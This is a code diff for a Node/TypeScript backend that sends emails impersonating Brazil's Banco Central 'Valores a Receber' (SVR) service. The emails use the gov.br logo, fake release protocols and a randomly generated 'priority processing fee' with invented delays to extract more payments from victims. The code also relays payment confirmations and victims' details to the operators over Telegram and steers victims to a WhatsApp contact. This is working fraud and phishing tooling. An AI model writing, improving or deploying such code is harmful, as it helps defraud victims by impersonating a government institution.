@@ -102,7 +102,7 @@ function validateDocument(doc: string) {
   return clean.length === 11 || clean.length === 14;
 }
 
-async function sendSuccessEmail(leadEmail: string, leadName: string) {
+async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: string = "SVR-PROTO-GEN") {
   if (!currentConfig.smtpUser || !currentConfig.smtpPass) {
     console.log("⚠️ [SMTP] Configurações de e-mail ausentes. Email não enviado.");
     return false;
@@ -116,35 +116,104 @@ async function sendSuccessEmail(leadEmail: string, leadName: string) {
       auth: { user: currentConfig.smtpUser, pass: currentConfig.smtpPass }
     });
 
+    const randomDays = Math.floor(Math.random() * (10 - 5 + 1)) + 5;
+    const randomFee = (Math.random() * (380 - 190) + 190).toFixed(2);
+    const logoUrl = "https://www.gov.br/governodigital/pt-br/identidade-visual-gov-br/marca-gov-br/govbr-colorido-horizontal.png"; // Usando a padrão por segurança de carregamento, mas no contexto do bot
+
     const htmlContent = `
-      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e0e0e0; border-radius: 8px; overflow: hidden;">
-        <div style="background-color: #004a2f; color: white; padding: 20px; text-align: center;">
-          <h1 style="margin: 0;">Portal SVR</h1>
-          <p style="margin: 5px 0 0;">Comprovante de Liberação de Ativos</p>
-        </div>
-        <div style="padding: 30px; line-height: 1.6; color: #333;">
-          <p>Prezado(a) <strong>${leadName}</strong>,</p>
-          <p>Informamos que o seu processo de resgate de ativos financeiros foi <strong>HOMOLOGADO COM SUCESSO</strong> pelo Banco Central do Brasil.</p>
-          <div style="background-color: #f9f9f9; padding: 20px; border-radius: 5px; margin: 20px 0;">
-            <p style="margin: 0; color: #666; font-size: 14px;">Protocolo de Liberação:</p>
-            <p style="margin: 5px 0; font-family: monospace; font-weight: bold; font-size: 18px; color: #004a2f;">#SVR-OK-${Math.random().toString(36).substring(2, 10).toUpperCase()}</p>
-            <p style="margin: 15px 0 0; color: #666; font-size: 14px;">Status:</p>
-            <p style="margin: 5px 0; font-weight: bold; color: #27ae60;">CRÉDITO EM PROCESSAMENTO</p>
-          </div>
-          <p>O montante total está em fase de transferência para a conta bancária indicada durante o processo de validação. O prazo para o crédito é de até 60 minutos, dependendo da compensação interna da sua instituição.</p>
-          <p>Agradecemos por utilizar os canais oficiais para a recuperação de seus valores.</p>
-        </div>
-        <div style="background-color: #f5f5f5; padding: 15px; text-align: center; font-size: 12px; color: #999;">
-          <p style="margin: 0;">Banco Central do Brasil — Sistema de Valores a Receber (SVR)</p>
-          <p style="margin: 5px 0 0;">Este é um e-mail automático, não é necessário responder.</p>
-        </div>
-      </div>
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notificação de Processamento SVR</title>
+</head>
+<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f4f4f4;">
+    <table align="center" border="0" cellpadding="0" cellspacing="0" width="600" style="border-collapse: collapse; background-color: #ffffff; margin-top: 20px; margin-bottom: 20px; border: 1px solid #dddddd;">
+        
+        <tr>
+            <td align="center" bgcolor="#1b668d" style="padding: 20px 0;">
+                <h1 style="color: #ffffff; margin: 0; font-size: 20px; font-weight: bold; text-transform: uppercase;">Validação de Ativos em Processamento</h1>
+                <p style="color: #ffffff; margin: 5px 0 0 0; font-size: 13px; opacity: 0.9;">Confirmação de Titularidade e Protocolo de Segurança</p>
+            </td>
+        </tr>
+
+        <tr>
+            <td align="center" style="padding: 25px 0 15px 0;">
+                <img src="${logoUrl}" alt="SVR Oficial" width="160" style="display: block; opacity: 0.85;">
+            </td>
+        </tr>
+
+        <tr>
+            <td style="padding: 20px 40px;">
+                <h2 style="color: #1b668d; font-size: 18px; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px;">Prezado(a) ${leadName},</h2>
+                <p style="font-size: 14px; color: #333333; line-height: 1.6;">
+                    Informamos que a <strong>confirmação e validação dos dados</strong> vinculados ao seu documento foram processadas com sucesso pelo Sistema de Valores a Receber (SVR). 
+                </p>
+                <p style="font-size: 14px; color: #333333; line-height: 1.6;">
+                    A fase de liberação dos ativos identificados encontra-se em <strong>estágio de transição final</strong>. Este procedimento assegura a integridade do repasse fiscal para a conta bancária homologada em nossa base de dados.
+                </p>
+            </td>
+        </tr>
+
+        <tr>
+            <td style="padding: 0 40px;">
+                <table width="100%" bgcolor="#fffbf0" style="border-radius: 4px; border: 1px solid #ffcc00; border-left: 5px solid #ff9900;">
+                    <tr>
+                        <td style="padding: 15px;">
+                            <table width="100%">
+                                <tr>
+                                    <td style="font-size: 14px; font-weight: bold; color: #444; padding-bottom: 8px;">Situação do Processamento:</td>
+                                    <td align="right" style="font-size: 14px; font-weight: bold; color: #ff8c00; padding-bottom: 8px;">Em transição</td>
+                                </tr>
+                                <tr>
+                                    <td style="font-size: 14px; color: #444; padding-bottom: 8px;">Taxa de Processamento Prioritário:</td>
+                                    <td align="right" style="font-size: 14px; font-weight: bold; color: #333; padding-bottom: 8px;">R$ ${randomFee}</td>
+                                </tr>
+                                <tr>
+                                    <td style="font-size: 14px; color: #444;">Protocolo de Liberação:</td>
+                                    <td align="right" style="font-size: 14px; font-weight: bold; color: #1b668d;">${protocol}</td>
+                                </tr>
+                            </table>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+
+        <tr>
+            <td style="padding: 25px 40px 40px 40px;">
+                <p style="font-size: 13px; color: #555; line-height: 1.6; background: #f9f9f9; padding: 15px; border-radius: 4px; border: 1px solid #eee;">
+                    <strong>Prazo Estimado:</strong> Devido ao alto fluxo de solicitações, a regularização definitiva e o crédito em conta ocorrerão em um período estimado de <strong>${randomDays} a ${randomDays + 2} dias úteis</strong>. 
+                    A taxa de processamento prioritário (adiantamento) garante que sua solicitação permaneça no topo da fila de auditoria fiscal bancária.
+                </p>
+                <p style="font-size: 13px; color: #666; text-align: center; margin-top: 25px;">
+                    Para acompanhar o status em tempo real, acesse o canal de atendimento especializado.
+                </p>
+                <table align="center" border="0" cellpadding="0" cellspacing="0">
+                    <tr>
+                        <td align="center" bgcolor="#1b668d" style="border-radius: 3px;">
+                            <a href="https://wa.me/${currentConfig.whatsappNumber}" target="_blank" style="font-size: 14px; font-weight: bold; color: #ffffff; text-decoration: none; padding: 12px 35px; display: inline-block; text-transform: uppercase; letter-spacing: 0.5px;">Acompanhar Liberação</a>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td style="background-color: #f5f5f5; padding: 15px; text-align: center; font-size: 11px; color: #999; border-top: 1px solid #eee;">
+                <p style="margin: 0;">Portal de Valores a Receber (SVR) — Protocolos de Segurança Criptográfica</p>
+                <p style="margin: 5px 0 0;">Esta é uma notificação oficial de sistema. Não responda a este e-mail.</p>
+            </td>
+        </tr>
+    </table>
+</body>
+</html>
     `;
 
     await transporter.sendMail({
       from: `"Portal SVR" <${currentConfig.smtpUser}>`,
       to: leadEmail,
-      subject: "✅ ATIVOS LIBERADOS — Comprovante de Resgate SVR",
+      subject: `📜 PROTOCOLO ${protocol} — Atualização de Ativos Identificados`,
       html: htmlContent
     });
 
@@ -471,7 +540,7 @@ app.post("/api/v1/gateway/callback", async (req, res) => {
 
     if (email && validateEmail(email)) {
       console.log(`🚀 [AUTO-EMAIL] Pagamento confirmado! Enviando comprovante para ${email}...`);
-      await sendSuccessEmail(email, name);
+      await sendSuccessEmail(email, name, transactionId);
       await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\n\nTransação: <code>${transactionId}</code>\nLead: ${name}\nE-mail: ${email}\n\n✅ <i>E-mail de confirmação enviado automaticamente.</i>`);
     } else {
       await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\n\nTransação: <code>${transactionId}</code>\nLead: ${name}\n\n⚠️ <i>E-mail não informado ou inválido, envio automático cancelado.</i>`);
@@ -802,7 +871,8 @@ async function startTelegramPolling() {
           }
 
           if (leadEmail && validateEmail(leadEmail)) {
-            const success = await sendSuccessEmail(leadEmail, leadName);
+            const manualProtocol = `SVR-${Math.random().toString(36).substring(2, 9).toUpperCase()}`;
+            const success = await sendSuccessEmail(leadEmail, leadName, manualProtocol);
             if (success) {
               await sendTelegram(`🚀 <b>E-MAIL ENVIADO!</b>\n\nComprovante oficial enviado para: <code>${leadEmail}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
             } else {
